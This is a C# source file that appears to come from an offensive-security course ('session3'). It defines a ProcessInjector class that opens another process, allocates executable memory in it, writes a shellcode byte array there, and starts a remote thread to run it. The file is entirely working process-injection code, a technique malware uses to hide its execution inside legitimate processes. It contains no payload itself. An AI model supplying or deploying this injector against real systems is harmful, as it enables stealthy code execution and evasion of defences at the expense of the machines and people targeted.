using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace session3
{
    class ProcessInjector
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr VirtualAllocEx(IntPtr processHandle, IntPtr address, int size, AllocationType allocationType, MemoryProtection protect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool WriteProcessMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, int size, out UIntPtr bytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr OpenProcess(ProcessAccessLevel desiredAccess, bool inheritHandle, int processID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateRemoteThread(IntPtr processHandle, IntPtr threadAttributes, uint size, IntPtr startAddress, IntPtr param, uint creationFlags, IntPtr threadID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern uint WaitForSingleObject(IntPtr handle, uint waitCriteria);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool VirtualProtectEx(IntPtr processHandle, IntPtr threadAddress, int size, MemoryProtection protection, out MemoryProtection old);

        public static void Inject(byte[] shell, Process process)
        {
            UIntPtr bytesWritten = UIntPtr.Zero;
            MemoryProtection oldProtect;

            IntPtr handle = OpenProcess(ProcessAccessLevel.PROCESS_CREATE_THREAD | ProcessAccessLevel.PROCESS_VM_OPERATION | ProcessAccessLevel.PROCESS_VM_WRITE | ProcessAccessLevel.PROCESS_VM_READ, false, process.Id);
            IntPtr memAllocationAddress = VirtualAllocEx(handle, IntPtr.Zero, shell.Length, AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
            bool ok = WriteProcessMemory(handle, memAllocationAddress, shell, shell.Length, out bytesWritten);
            Console.WriteLine($"Mem Written? {ok} - {bytesWritten}");

            IntPtr threadHandle = CreateRemoteThread(handle, IntPtr.Zero, 0, memAllocationAddress, IntPtr.Zero, 0, IntPtr.Zero);
            uint res = WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }
    }
}